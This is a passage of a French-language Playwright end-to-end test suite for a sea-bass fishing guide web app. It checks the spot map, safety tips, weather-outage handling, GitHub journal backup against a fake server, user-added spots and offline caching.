      ok((await page.evaluate(() => location.hash)) === "#leurres" && /☀ (plein soleil|jour|ciel couvert)/.test(await T(page)), L("créneau de plein jour : l'onglet Leurres s'ouvre sur ce créneau"));
      await tab(page, "Synthèse");
    }
    // Carte
    await tab(page, "Spots");
    await page.waitForFunction((n) => document.querySelectorAll(".leaflet-container path.leaflet-interactive:not(.spot-hit)").length >= n, nSpots + 1, { timeout: 8000 }).catch(() => {});
    const disks = await page.evaluate(() => document.querySelectorAll(".leaflet-container path.leaflet-interactive:not(.spot-hit)").length);
    ok(disks === nSpots + 1, L(`carte : ${nSpots} spots + le village (${disks})`));
    ok(om.tiles > 0 && /OpenStreetMap/.test(await T(page)), L(`carte : fond OpenStreetMap chargé et attribué (${om.tiles} tuiles)`));
    ok(await page.evaluate(() => document.querySelectorAll(".leaflet-tooltip").length) >= 3, L("carte : étiquettes du TOP 3 visibles"));
    const [pickId, pickName] = PF.pick;
    // Le disque peut tomber sous le bandeau du bas : on le centre avant de le toucher.
    const disk = page.locator(`path.spot-${pickId}`);
    await disk.evaluate((el) => el.scrollIntoView({ block: "center" }));
    await page.waitForTimeout(200);
    await disk.click({ force: true });
    await page.waitForTimeout(500);
    const h2now = await page.evaluate(() => document.querySelector("h2")?.textContent || "");
    ok(new RegExp(pickName).test(h2now), L("carte → fiche du spot touché") + (new RegExp(pickName).test(h2now) ? "" : ` — ${h2now}`));
    // Sécurité
    await btn(page, /^Voir les \d+/).click();
    await page.getByRole("button", { name: new RegExp(PF.sec[0]) }).first().click();
    await page.waitForTimeout(300);
    await btn(page, /^Accès$/).click();
    const ta = await T(page);
    ok(/Sécurité sur ce spot/.test(ta) && PF.sec[1].test(ta), L("sécurité : consignes sourcées dans l'onglet Accès"));
    // Orientation
    await btn(page, /^Terrain$/).click();
    ok(/Orientation du poste/.test(await T(page)), L("orientation : boussole affichée"));
    await btn(page, /C'est juste/).click();
    await page.waitForTimeout(300);
    const or = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:orient:")).map((k) => localStorage.getItem(k)).join(""));
    ok(/"water"/.test(or) && /Orientation confirmée/.test(await T(page)), L("orientation : confirmée, mémorisée sur l'appareil"));
    await page.selectOption('select[aria-label="Direction de l\'eau"]', "E");
    await page.waitForTimeout(300);
    ok(/Orientation corrigée/.test(await T(page)) && /Corrigée sur place/.test(await T(page)), L("orientation : corrigée, le classement suit"));
    // Session en cours
    await btn(page, /Je pêche ici maintenant/).click();
    await waitText(page, /\+1 bar/);
    ok(await page.evaluate(() => { const n = document.getElementById("bandeau-session"); const r = n?.getBoundingClientRect(); const nav = document.querySelector("nav.bottom-nav").getBoundingClientRect(); return !!n && /Session en cours/.test(n.textContent) && r.top >= 0 && r.bottom <= nav.top + 0.5 && r.height <= 56; }), L("session en cours : bandeau compact en haut, sans chevauchement avec la barre du bas"));
    ok(await page.evaluate(() => Object.keys(localStorage).some((k) => k.startsWith("bar:encours:"))), L("session en cours : démarrée et mémorisée"));
    // v8.9 : un bar compté d'un appui pendant la session, reporté dans le journal.
    await page.getByRole("button", { name: "Un bar de plus" }).click();
    await page.waitForTimeout(200);
    ok(/1 bar/.test(await page.evaluate(() => document.getElementById("bandeau-session")?.textContent || "")), L("session en cours : « +1 bar » compte la prise"));
    await page.getByRole("button", { name: /^Terminer$/ }).click();
    await page.waitForTimeout(500);
    const pre = await page.evaluate(() => [document.querySelector('input[type="time"]')?.value, document.querySelector('input[aria-label="Durée de la session en heures"]')?.value, location.hash, document.querySelector('input[type="number"]')?.value]);
    ok(/^\d\d:\d\d$/.test(pre[0] || "") && pre[1] === "0,25" && pre[2] === "#journal" && pre[3] === "1", L(`session terminée : journal prérempli (heure ${pre[0]}, durée ${pre[1]} h, ${pre[3]} prise)`));
    await btn(page, /^Enregistrer$/).click();
    await page.waitForTimeout(500);
    const st = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:")).map((k) => localStorage.getItem(k)).join(""));
    // Seule la session qui vient d'être notée compte (le journal de Logonna contient aussi les sessions réelles de Félix).
    const mine = await page.evaluate(() => Object.keys(localStorage).filter((k) => k.startsWith("bar:journal:"))
      .flatMap((k) => { try { return JSON.parse(localStorage.getItem(k) || "[]"); } catch { return []; } }).filter((e) => !e.seed && e.duree === 0.25));
    const stOk = mine.length === 1 && mine[0].fish === 1 && mine[0].result == null;
    ok(stOk, L("session terminée : durée et prise enregistrées, note ressentie non inventée") + (stOk ? "" : ` — ${st.slice(0, 600)}`));
    ok(/Prises par spot/.test(await T(page)) && /bar\/h|durée non saisie/.test(await T(page)), L("journal : prises par spot affichées"));
    // Onglets de détail
    await tab(page, "Saison");
    ok(/Saison :/.test(await T(page)) && /L'année du bar/.test(await T(page)) && /Proies du mois/.test(await T(page)), L("onglet Saison : saison, année du bar, proies"));
    await tab(page, "Règles");
    ok(/Bien relâcher un bar/.test(await T(page)) && /Sécurité, spot par spot/.test(await T(page)), L("onglet Règles : réglementation, remise à l'eau, sécurité"));
    // Février : no-kill annoncé, année non vérifiée signalée
    await tab(page, "Synthèse");
    await page.fill('input[type="date"]', "2027-02-10");
    await page.waitForTimeout(900); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    const tf = await T(page);
    if (PF.south) ok(!/No-kill obligatoire/.test(tf) && /2 bars \/ pêcheur \/ jour/.test(tf) && /à revérifier/.test(tf), L("février, au sud du 48e : pas de no-kill, 2 bars par jour, règles d'une autre année signalées"));
    else ok(/No-kill obligatoire/.test(tf) && /à revérifier/.test(tf), L("février : no-kill annoncé, règles d'une autre année signalées"));
    await page.screenshot({ path: `${SHOTS}/${site}-v7.png` });
    ok(errors.length === 0, L("onglets : aucune erreur JavaScript" + (errors.length ? " — " + errors.slice(0, 2).join(" | ") : "")));
    await ctx.close();
  }
  // ── 2. Pannes météo ──
  for (const sc of ["allfail", "offline", "range"]) {
    const { ctx, page, errors } = await openApp(site, { scenario: sc });
    await waitText(page, /Météo indisponible/, 25000);
    // Détail technique replié par défaut : on l'ouvre pour lire le message d'origine.
    await page.evaluate(() => document.querySelectorAll("details").forEach((d) => { d.open = true; }));
    const txt = await T(page);
    ok(/coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), L(`${sc} : la marée reste affichée`));
    if (sc === "offline") ok(/Pas de réseau/.test(txt) && /marée et la lumière seules/.test(txt), L("offline : « Pas de réseau », conseil sur la marée et la lumière seules"));
    if (sc === "allfail") ok(/Open-Meteo n'a pas répondu/.test(txt) && /Simulated failure/.test(txt), L("allfail : message cite la réponse"));
    if (sc === "range") ok(/horizon/.test(txt), L("range : message d'horizon"));
    // Revue finale des phases 3 et 4 : sans météo, le vent est inconnu → tout est « à vérifier », rade comprise
    // (avant : les spots de rade passaient au vert, vent compté calme).
    {
      const hero = await page.evaluate(() => document.getElementById("hero-h")?.textContent || "");
      const rings = await page.evaluate(() => [...document.querySelectorAll('svg[role="img"][aria-label^="Note "]')].map((s) => [s.getAttribute("aria-label"), [...s.querySelectorAll("circle")].map((c) => c.getAttribute("stroke")).join()]));
      ok((!hero || /Conditions à vérifier/.test(hero)) && rings.every(([l, st]) => /à vérifier/.test(l) && !/#22c55e/i.test(st)),
        L(`${sc} : sans météo, rien au vert — bandeau « ${hero.trim().slice(0, 30)} », ${rings.length} jauge(s) « à vérifier »`));
      if (sc === "allfail") ok(/vent inconnu|vent et houle inconnus/.test(txt), L("allfail : la raison (vent inconnu) est affichée"));
    }
    ok(errors.length === 0, L(`${sc} : aucune erreur JavaScript` + (errors.length ? " — " + errors[0] : "")));
    if (sc === "allfail") await page.screenshot({ path: `${SHOTS}/${site}-allfail.png` });
    await ctx.close();
  }
  // ── 3. Dégradation marine ──
  {
    const { ctx, page, errors } = await openApp(site, { scenario: "marinefail" });
    await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
    await tab(page, "Météo");
    ok(/Houle et température d'eau indisponibles/.test(await T(page)), L("marine en panne : alerte visible, météo affichée"));
    // Phase 4 — Houle inconnue : un spot de côte ouverte est « à vérifier », jamais au vert. Vérifié sur les guides
    // sans spot de rade (en rade, la mer du vent est calculée sur place : la houle y reste connue).
    if (["pirou", "audierne", "concarneau", "crozon"].includes(site)) {
      await tab(page, "Spots");
      await page.waitForTimeout(300);
      const cols = await page.evaluate(() => [...document.querySelectorAll("span")].filter((e) => /^\d,\d$/.test(e.textContent.trim()) && e.children.length === 0)
        .map((e) => getComputedStyle(e).color));
      ok(cols.length > 0 && !cols.includes("rgb(34, 197, 94)"), L(`marine en panne : aucune note au vert, toutes « à vérifier » (${cols.length} notes)`));
      await tab(page, "Synthèse");
      const hero = await page.evaluate(() => document.getElementById("hero-h")?.textContent || "");
      ok(!hero || /Conditions à vérifier/.test(hero), L(`marine en panne : le bandeau dit « à vérifier » — « ${hero.trim().slice(0, 40)} »`));
      const rings = await page.evaluate(() => [...document.querySelectorAll('svg[role="img"][aria-label^="Note "]')].map((s) => [s.getAttribute("aria-label"), [...s.querySelectorAll("circle")].map((c) => c.getAttribute("stroke")).join()]));
      ok(rings.length > 0 && rings.every(([l, st]) => /à vérifier/.test(l) && !/#22c55e/i.test(st)), L(`marine en panne : jauges orange, annoncées « à vérifier » (${rings.length})`));
    }
    ok(errors.length === 0, L("marine en panne : aucune erreur JavaScript"));
    await ctx.close();
  }
}

// ── 4. Sauvegarde GitHub du journal ──
{
  const SYNC = { owner: "spumy", repo: "journal", token: "github_pat_TEST" };
  // a) dépôt vide → premier enregistrement crée le fichier (seeds compris)
  const gh = fakeGitHub();
  const { ctx, page, errors } = await openApp("logonna", { sync: SYNC, gh });
  await waitText(page, READY);
  await tab(page, "Journal");
  await page.fill('input[placeholder^="Asturie"]', "Z Claw blanc nacré e2e");
  await btn(page, /^Enregistrer$/).click();
  await waitText(page, /Journal sauvegardé sur GitHub/, 10000);
  const f = gh.files.get("journal-logonna-daoulas.json");
  const arr = f ? JSON.parse(f.content) : [];
  ok(arr.some((e) => /Z Claw blanc nacré e2e/.test(e.lure)), "GitHub : la session est écrite dans le dépôt");
  ok(arr.length >= 4, `GitHub : les 3 sessions archivées sont aussi sauvegardées (${arr.length})`);
  ok(/Z Claw blanc nacré e2e/.test(f?.content || "") && /é/.test(f.content), "GitHub : UTF-8 préservé (accents)");
  ok(errors.length === 0, "GitHub : aucune erreur JavaScript" + (errors.length ? " — " + errors[0] : ""));
  await page.screenshot({ path: `${SHOTS}/sync-ok.png` });
  await ctx.close();

  // b) autre appareil : le journal du dépôt est récupéré au démarrage
  const remote = JSON.stringify([...arr, { id: "log-remote-1", spotId: "bendy", date: "2026-09-30", result: 7, fish: 2, lure: "Session venue du téléphone", predicted: null, note: "" }]);
  const gh2 = fakeGitHub({ files: { "journal-logonna-daoulas.json": remote } });
  const o2 = await openApp("logonna", { sync: SYNC, gh: gh2 });
  await waitText(o2.page, READY);
  const local2 = await o2.page.evaluate(() => localStorage.getItem("bar:journal:logonna-daoulas") || "");
  ok(/Session venue du téléphone/.test(local2), "autre appareil : sessions du dépôt récupérées au démarrage");
  await tab(o2.page, "Journal");
  ok(/Pointe du Bendy/.test(await T(o2.page)), "autre appareil : la session récupérée apparaît dans le journal");
  await o2.ctx.close();

  // c) conflit d'écriture : relecture, fusion, nouvelle écriture
  const gh3 = fakeGitHub({ conflicts: 1 });
  const o3 = await openApp("pirou", { sync: SYNC, gh: gh3 });
  await waitText(o3.page, READY);
  await tab(o3.page, "Journal");
  await btn(o3.page, /^Enregistrer$/).click();
  await waitText(o3.page, /Journal sauvegardé sur GitHub/, 10000);
  ok(gh3.files.has("journal-pirou-plage.json"), "conflit 409 : résolu par relecture et fusion");
  await o3.ctx.close();

  // c bis) lot 3.8 — dépôt de sauvegarde PUBLIC : aucune écriture, message clair, le journal reste sur le téléphone
  const gh3b = fakeGitHub({ publicRepo: true });
  const o3b = await openApp("logonna", { sync: SYNC, gh: gh3b });
  await waitText(o3b.page, READY);
  await tab(o3b.page, "Journal");
  await o3b.page.fill('input[placeholder^="Asturie"]', "Essai sauvegarde refusée");
  await btn(o3b.page, /^Enregistrer$/).click();
  await waitText(o3b.page, /dépôt spumy\/journal public/, 10000).catch(() => {});
  const local3b = await o3b.page.evaluate(() => localStorage.getItem("bar:journal:logonna-daoulas") || "");
  ok(!gh3b.log.some((l) => l.startsWith("PUT")) && /dépôt spumy\/journal public/.test(await T(o3b.page)) && /Essai sauvegarde refusée/.test(local3b),
    "[sécurité] dépôt de sauvegarde public : rien n'est envoyé, message clair, la session reste sur le téléphone" + ` — ${gh3b.log.join(", ")}`);
  await o3b.ctx.close();

  // d) jeton refusé : message clair, l'application fonctionne
  const gh4 = fakeGitHub({ status401: true });
  const o4 = await openApp("logonna", { sync: SYNC, gh: gh4 });
  await waitText(o4.page, READY);
  ok(/jeton refusé/.test(await T(o4.page)), "jeton refusé : message explicite, application utilisable");
  await o4.ctx.close();

  // e) réglages : saisie du jeton depuis l'interface
  const gh5 = fakeGitHub();
  const o5 = await openApp("logonna", { gh: gh5 });
  await waitText(o5.page, READY);
  await tab(o5.page, "Plus");
  await o5.page.getByRole("button", { name: "Réglages" }).click();
  await o5.page.screenshot({ path: `${SHOTS}/sync-settings.png` });
  await o5.page.fill('input[type="password"]', "github_pat_TEST");
  await o5.page.getByRole("button", { name: "Enregistrer et tester" }).click();
  await waitText(o5.page, /Journal sauvegardé sur GitHub/, 10000);
  ok(await o5.page.evaluate(() => JSON.parse(localStorage.getItem("bar:sync") || "{}").token === "github_pat_TEST"), "réglages : jeton testé puis mémorisé sur l'appareil");
  await tab(o5.page, "Journal");
  await btn(o5.page, /^Enregistrer$/).click();
  await o5.page.waitForTimeout(2500);
  ok(gh5.files.has("journal-logonna-daoulas.json"), "réglages : la session suivante part sur GitHub");
  await o5.ctx.close();
}

// ── 4 bis. v8.11 : tes spots, ajoutés sur le téléphone. v8.14 : depuis l'accueil, rangés dans le bon guide ──
{
  const SYNC = { owner: "spumy", repo: "journal", token: "github_pat_TEST" };
  const gh = fakeGitHub();
  const ctxG = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block",
    geolocation: { latitude: 48.3305, longitude: -4.295, accuracy: 12 }, permissions: ["geolocation"] });
  const { ctx, page, errors, om } = await openApp("logonna", { sync: SYNC, gh, context: ctxG });
  await waitText(page, WX);
  await tab(page, "Spots");
  // Dans un guide, le bouton mène à l'accueil, formulaire ouvert.
  const addLink = page.getByRole("link", { name: /Ajouter un spot/ });
  ok(await addLink.getAttribute("href") === "index.html#ajouter" && await page.getByRole("button", { name: "＋ Ajouter un spot" }).count() === 0, "guide : « Ajouter un spot » mène à l'accueil (plus de formulaire d'ajout dans le guide)");
  await addLink.click();
  await page.waitForURL(/index\.html#ajouter$/);
  const form = page.locator('form[aria-label="Ajouter un spot"]');
  await form.waitFor({ timeout: 10000 });
  ok(await form.isVisible(), "accueil #ajouter : le formulaire est ouvert");
  const pick = (name) => form.getByRole("button", { name, exact: true }).click();
  await pick("Ajouter ce spot");
  ok(/Donne un nom au spot/.test(await T(page)), "ton spot : sans nom, le formulaire le demande");
  await page.fill("#ms-name", "Poste test e2e");
  await pick("Ajouter ce spot");
  ok(/Place le spot/.test(await T(page)), "ton spot : sans position, le formulaire la demande");
  await form.getByLabel("Coordonnées ou lien Google Maps").fill("43.30, 5.37");
  await pick("Placer"); await pick("S"); await pick("Ajouter ce spot");
  ok(/Aucun guide ne couvre ce point : la fiche la plus proche \(.+, guide .+\) est à \d+ km/.test(await T(page)), "ton spot : un point à Marseille n'est rangé dans aucun guide");
  await form.getByLabel("Coordonnées ou lien Google Maps").fill("lien illisible");
  await pick("Placer");
  ok(/Coordonnées illisibles/.test(await T(page)), "ton spot : coordonnées illisibles signalées");
  // Carte : un appui place le spot.
  await form.locator(".leaflet-container").scrollIntoViewIfNeeded(); await page.waitForTimeout(300);
  const mapBox = await form.locator(".leaflet-container").boundingBox();
  await page.mouse.click(mapBox.x + mapBox.width / 2, mapBox.y + mapBox.height / 2);
  await page.waitForTimeout(300);
  ok(/\(carte\)/.test(await T(page)), "ton spot : un appui sur la carte place le spot");
  // Dans les Abers : rangé dans le guide Plouguerneau.
  await form.getByLabel("Coordonnées ou lien Google Maps").fill("48.6005, -4.5655");
  await pick("Placer");
  ok(/Ce spot ira dans le guide Plouguerneau\./.test(await T(page)), "ton spot : un point des Abers va dans le guide Plouguerneau");
  // GPS (position simulée, en rade de Brest) : rangé dans le guide Logonna-Daoulas.
  await pick("📍 Ma position");
  await waitText(page, /Position : 48,33050 \/ -4,29500 \(GPS, à ±12 m\)/, 8000).catch(() => {});
  ok(/Position : 48,33050 \/ -4,29500 \(GPS, à ±12 m\)/.test(await T(page)) && /Ce spot ira dans le guide Logonna-Daoulas\./.test(await T(page)) && /Spot du guide le plus proche : /.test(await T(page)), "ton spot : position GPS, guide choisi tout seul (rade de Brest → Logonna-Daoulas), spot le plus proche");
  await pick("Pointe rocheuse"); await pick("S"); await pick("Modéré"); await pick("Roche, goémon"); await pick("À la montante");
  ok(await form.count() === 1 && (await page.evaluate(() => localStorage.getItem("bar:myspots:logonna-daoulas"))) === null, "ton spot : choisir une option n'envoie pas le formulaire");
  await page.fill("#ms-notes", "Cale du moulin, parking en haut.");
  const calls0 = om.calls;
  await pick("Ajouter ce spot");
  await waitText(page, /« Poste test e2e » est ajouté au guide Logonna-Daoulas/);
  const recs = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:myspots:logonna-daoulas") || "[]"));
  const myId = recs[0]?.id;
  ok(recs.length === 1 && /^moi-[a-z0-9]+$/.test(myId) && recs[0].water === 180 && recs[0].phase === "montant" && recs[0].danger === 2, "ton spot : enregistré dans le guide Logonna-Daoulas (fiche nettoyée)" + ` — ${JSON.stringify(recs[0] || {}).slice(0, 160)}`);
  await waitCalls(om, calls0 + 3);
  await page.waitForFunction((id) => { const p = document.querySelector(`path.gspot-logonna-${id}`); return p && p.getAttribute("data-score") !== "?"; }, myId, { timeout: 15000 }).catch(() => {});
  const myMark = await page.evaluate((id) => { const p = document.querySelector(`path.gspot-logonna-${id}`); return p ? { score: p.getAttribute("data-score"), stroke: p.getAttribute("stroke") } : null; }, myId);
  ok(om.calls >= calls0 + 3 && myMark && myMark.score !== "?" && myMark.stroke === "#f472b6", `ton spot : sur la carte de l'accueil, noté avec sa propre météo, contour rose (${om.calls - calls0} requêtes) — ${JSON.stringify(myMark)}`);
  await page.fill("#q", "poste test");
  const hit0 = await page.evaluate(() => { const a = document.querySelector("#results a"); return a ? a.getAttribute("href") : null; });
  ok(hit0 === `logonna.html#spot=${myId}`, "ton spot : aussitôt dans la recherche de l'accueil");
  await page.fill("#q", "");
  // Le lien mène à sa fiche dans le guide.
  await page.getByRole("link", { name: "Voir le spot dans le guide Logonna-Daoulas →" }).click();
  await waitText(page, /Spot ajouté par toi/);
  await page.waitForTimeout(800);
  const det = await T(page);
  ok(await page.evaluate(() => document.querySelector("h2")?.textContent) === "Poste test e2e" && /Ton spot/.test(det) && /Modifier ce spot/.test(det), "ton spot : sa fiche s'ouvre dans le guide, badge « Ton spot »");
  await waitText(page, /Ici \(6 h-22 h\) : 🌬/, 8000).catch(() => {});
  ok(/Ici \(6 h-22 h\) : 🌬/.test(await T(page)), "ton spot : météo propre à ses coordonnées");
  ok(/selon toi/.test(await T(page)), "ton spot : créneaux de ta phase de marée (« selon toi »)");
  ok(await page.getByRole("button", { name: "Voir les 12" }).count() === 1, "ton spot : classé avec les 11 spots du guide");
  ok(await page.getByRole("button", { name: "Poste test e2e" }).count() === 1, "guide : ton spot listé dans « Tes spots »");
  await tab(page, "Journal");
  ok(await page.evaluate(() => [...document.querySelectorAll("select option")].some((o) => o.textContent === "Poste test e2e")), "ton spot : proposé dans le journal");
  await page.waitForTimeout(2500);
  const remoteSpots = gh.files.get("spots-logonna-daoulas.json");
  ok(remoteSpots && JSON.parse(remoteSpots.content).some((r) => r.id === myId && r.name === "Poste test e2e"), "ton spot : sauvegardé sur GitHub à l'ouverture de son guide");
  // Rechargement, lien direct.
  await page.goto(`${BASE}/`);   // vraie nouvelle page (un simple changement d'ancre ne recharge pas)
  await page.goto(`${BASE}/logonna.html#spot=${myId}`); await waitText(page, /Spot ajouté par toi/);
  await page.waitForTimeout(500);
  ok(await page.evaluate(() => document.querySelector("h2")?.textContent) === "Poste test e2e", "ton spot : gardé au rechargement, lien direct #spot=…");
  // Modification sur place.
  await page.getByRole("button", { name: "Modifier ce spot" }).click();
  await page.fill("#ms-name", "Poste test e2e modifié");
  await page.locator('form[aria-label="Modifier ton spot"]').getByRole("button", { name: "Enregistrer les modifications" }).click();
  await page.waitForTimeout(500);
  ok(await page.evaluate(() => document.querySelector("h2")?.textContent) === "Poste test e2e modifié", "ton spot : modifié");
  // Déplacé dans les Abers : il passe dans le guide Plouguerneau (une suppression reste notée à Logonna).
  await page.getByRole("button", { name: "Modifier ce spot" }).click();
  const ef = page.locator('form[aria-label="Modifier ton spot"]');
  await ef.getByLabel("Coordonnées ou lien Google Maps").fill("48.6005, -4.5655");
  await ef.getByRole("button", { name: "Placer", exact: true }).click();
  ok(/Ce point relève du guide Plouguerneau : le spot y sera déplacé\./.test(await T(page)), "ton spot déplacé : le guide d'arrivée est annoncé");
  const callsMv = om.calls;
  await ef.getByRole("button", { name: "Enregistrer les modifications" }).click();
  await page.waitForURL(new RegExp(`plouguerneau\\.html#`)); await waitText(page, /Spot ajouté par toi/);
  await waitCalls(om, callsMv + 3);
  ok(om.calls >= callsMv + 3, `ton spot déplacé : sa météo est demandée dans le guide d'arrivée (${om.calls - callsMv} requêtes)`);
  await page.waitForTimeout(500);
  const moved = await page.evaluate((id) => ({ lo: JSON.parse(localStorage.getItem("bar:myspots:logonna-daoulas") || "[]").find((r) => r.id === id), pl: JSON.parse(localStorage.getItem("bar:myspots:plouguerneau") || "[]").find((r) => r.id === id), h2: document.querySelector("h2")?.textContent }), myId);
  ok(moved.lo?.deleted === true && moved.pl && !moved.pl.deleted && moved.pl.lat === 48.6005 && moved.pl.tidePort === null && moved.h2 === "Poste test e2e modifié", "ton spot déplacé : rangé dans le guide Plouguerneau, sa fiche s'y ouvre (suppression notée à Logonna)" + ` — ${JSON.stringify(moved).slice(0, 200)}`);
  ok(/Spot ajouté par toi : marée du port de L'Aber Wrac'h/.test(await T(page)), "ton spot déplacé : marée d'un port du guide d'arrivée (L'Aber Wrac'h)");
  // Suppression (confirmation dans la page) : une trace reste pour la sauvegarde.
  await page.getByRole("button", { name: "Supprimer", exact: true }).click();
  ok(/Supprimer « Poste test e2e modifié » \? Les sessions de ton journal sont gardées/.test(await T(page)), "ton spot : suppression confirmée dans la page");
  await page.getByRole("button", { name: "Oui, supprimer" }).click();
  await page.waitForTimeout(800);
  const after = await page.evaluate(() => JSON.parse(localStorage.getItem("bar:myspots:plouguerneau") || "[]"));
  const gone = { txt: !/Poste test e2e/.test(await T(page)), map: await page.locator(`path.spot-${myId}`).count() === 0, rec: after.length === 1 && after[0].deleted === true, n: await page.getByRole("button", { name: "Voir les 10" }).count() === 1 };
  ok(Object.values(gone).every(Boolean), "ton spot : supprimé partout, carte comprise (trace gardée pour la sauvegarde)" + ` — ${JSON.stringify(gone)}`);
  await page.waitForTimeout(2500);
  const remoteAfter = gh.files.get("spots-plouguerneau.json");
  ok(remoteAfter && JSON.parse(remoteAfter.content).find((r) => r.id === myId)?.deleted === true, "ton spot : la suppression part aussi sur GitHub");
  ok(errors.length === 0, "ton spot : aucune erreur JavaScript" + (errors.length ? " — " + errors.slice(0, 2).join(" | ") : ""));
  await page.screenshot({ path: `${SHOTS}/ton-spot.png` });
  await ctx.close();
  // Autre appareil : le spot sauvegardé sur GitHub revient au démarrage.
  const rec = { id: "moi-autreappareil", name: "Spot du téléphone", lat: 48.31, lon: -4.33, water: 225, type: "plage", danger: 1, fond: "sable", prof: "estran", phase: "inconnu", notes: "", tidePort: null, minutes: null, createdAt: 1, updatedAt: 2 };
  const gh2 = fakeGitHub({ files: { "spots-logonna-daoulas.json": JSON.stringify([rec]) } });
  const o2 = await openApp("logonna", { sync: SYNC, gh: gh2 });
  await waitText(o2.page, READY);
  await tab(o2.page, "Spots");
  await o2.page.getByRole("button", { name: "Voir les 12" }).click();
  ok(/Spot du téléphone/.test(await T(o2.page)) && /Ton spot/.test(await T(o2.page)), "autre appareil : ton spot sauvegardé sur GitHub revient au démarrage");
  ok(o2.errors.length === 0, "autre appareil : aucune erreur JavaScript");
  await o2.ctx.close();
}

// ── 4 ter. v8.12 : les créneaux déjà passés ne sont plus affichés (ils étaient barrés) ──
{
  const { ctx, page, errors } = await openApp("logonna", { now: FIXED_NOW + 17 * 36e5 });   // 23 h 30 à Paris
  await waitText(page, READY);
  await tab(page, "Spots");
  await page.waitForTimeout(500);
  const st = await page.evaluate(() => ({ strike: [...document.querySelectorAll("span")].filter((e) => getComputedStyle(e).textDecorationLine.includes("line-through")).length,
    passe: [...document.querySelectorAll("span")].some((e) => e.textContent === "Passé"), txt: document.body.innerText }));
  ok(st.strike === 0 && !st.passe, "créneaux passés : plus aucun créneau barré ni marqué « Passé » dans la fiche");
  ok(/Tous les créneaux d'aujourd'hui sur ce spot sont passés|créneaux? déjà passés? aujourd'hui (n'est|ne sont) plus affichés?/.test(st.txt), "créneaux passés : la fiche dit combien sont masqués, ou qu'ils le sont tous");
  if (/Tous les créneaux d'aujourd'hui sur ce spot sont passés/.test(st.txt)) {
    await page.getByRole("button", { name: /^Voir demain/ }).first().click(); await page.waitForTimeout(600);
    ok(/Demain/.test(await T(page)) && !/Tous les créneaux d'aujourd'hui sur ce spot sont passés/.test(await T(page)), "créneaux passés : « Voir demain » ouvre les créneaux du lendemain");
  }
  await tab(page, "Leurres");
  ok(await page.evaluate(() => [...document.querySelectorAll("span,button")].filter((e) => getComputedStyle(e).textDecorationLine.includes("line-through")).length) === 0, "créneaux passés : rien de barré dans l'onglet Leurres");
  ok(errors.length === 0, "créneaux passés : aucune erreur JavaScript");
  await ctx.close();
}

// ── 5. Hors ligne sur le spot (service worker) ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "allow" });
  const { page, errors } = await openApp("logonna", { context: ctx, sw: "allow" });
  await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);
  await page.evaluate(() => navigator.serviceWorker.ready);
  await page.reload(); await waitText(page, /🌬 [A-Z]{1,3} \d+ km\/h/);   // page désormais contrôlée par le SW
  await ctx.setOffline(true);
  await page.reload();
  await waitText(page, READY, 15000);
  await page.waitForTimeout(800);
  const txt = await T(page);
  ok(/coef \d+/.test(txt) && /PM \d\dh\d\d/.test(txt), "hors ligne : l'application s'ouvre, marée calculée");
  ok(/🌬 [A-Z]{1,3} \d+ km\/h/.test(txt), "hors ligne : dernière météo téléchargée réaffichée");
  ok(errors.filter((e) => !/net::|Failed to fetch/.test(e)).length === 0, "hors ligne : aucune erreur JavaScript");
  // Toute l'application est en cache dès l'installation du service worker, y compris les pages pas encore ouvertes.
  const cached = await page.evaluate(async () => { const c = await caches.open((await caches.keys())[0]); return (await c.keys()).map((r) => new URL(r.url).pathname); });
  const want = ["/", ...SITE_FILES.filter((f) => f !== "sw.js").map((f) => `/${f}`)].map((x) => PREFIX + x);
  ok(want.every((w) => cached.includes(w)), "hors ligne : accueil, sept guides, manifeste et icônes en cache" + (want.every((w) => cached.includes(w)) ? "" : " — " + cached.join(", ")));
  await page.goto(`${BASE}/`);
  ok(/Chercher un spot/.test(await T(page)) && await page.evaluate(() => document.querySelectorAll("details.dept a.card").length) === 7, "hors ligne : l'accueil s'ouvre");
  await page.click('details.dept[data-dept="50"] > summary');
  await page.click('a[href="pirou.html"]'); await waitText(page, READY, 15000);
  ok(/coef \d+/.test(await T(page)), "hors ligne : accueil → Pirou (jamais ouvert) : marée calculée");
  await page.goto(`${BASE}/audierne.html`); await waitText(page, READY, 15000);
  ok(/coef \d+/.test(await T(page)), "hors ligne : Audierne (jamais ouvert) : marée calculée");
  await ctx.close();
}

// ── 5 quinquies. Phase 4 — Fiche du guide illisible (premier lancement sans réseau) : message clair, rien de cassé ──
{
  const ctx = await browser.newContext({ ...devices["iPhone 13"], locale: "fr-FR", timezoneId: "Europe/Paris", serviceWorkers: "block" });
  await ctx.route(/\/logonna\.json/, (r) => r.abort("internetdisconnected"));
  const page = await ctx.newPage(); const errs = []; page.on("pageerror", (e) => errs.push(e.message));
  await page.goto(`${BASE}/logonna.html`);
  await waitText(page, /Le guide n'a pas pu se charger/, 10000).catch(() => {});
  const txt = await T(page);
  ok(/Le guide n'a pas pu se charger/.test(txt) && /Ton journal n'est pas touché/.test(txt) && await page.getByRole("button", { name: "Recharger" }).count() === 1 && !errs.length,
    "fiche du guide injoignable : message clair, bouton Recharger, aucune erreur JavaScript" + (errs.length ? ` — ${errs[0]}` : ""));
  await ctx.close();
}

// ── 5 quater. Lot 3.8 — Sauvegarde sans GitHub : export du journal, puis import sur un téléphone neuf ──
{
  const a = await openApp("logonna");
  await waitText(a.page, READY);
  await tab(a.page, "Journal");
  await a.page.fill('input[placeholder^="Asturie"]', "Essai export");
  await a.page.fill('input[type="time"]', "07:40");
  await btn(a.page, /^Enregistrer$/).click(); await a.page.waitForTimeout(400);
  const before = await a.page.evaluate(() => JSON.parse(localStorage.getItem("bar:journal:logonna-daoulas") || "[]"));
  const [dl] = await Promise.all([a.page.waitForEvent("download"), btn(a.page, /^Exporter$/).click()]);
  const file = path.join(SHOTS, "journal-export.json");
  await dl.saveAs(file);
  const exported = JSON.parse(fs.readFileSync(file, "utf8"));
